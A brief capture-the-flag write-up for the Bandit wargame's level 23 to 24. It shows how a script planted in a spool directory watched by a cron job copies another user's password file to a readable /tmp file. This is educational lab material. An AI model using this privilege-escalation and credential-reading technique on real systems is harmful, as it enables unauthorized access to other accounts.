# Bandit Level 23 → 24

## Objective
Inject a script into a folder monitored by a cron job running as `bandit24`.

## Tools Used
- `bash`, `chmod`, `cp`

## Process
1. Created `/tmp/myscript.sh`:
   `cat /etc/bandit_pass/bandit24 > /tmp/out.txt`
2. `chmod 777 /tmp/myscript.sh`
3. `cp /tmp/myscript.sh /var/spool/bandit24/foo/`
4. Read `/tmp/out.txt` after 1 minute.

## What I Learned
- Script injection via shared "spool" directories.
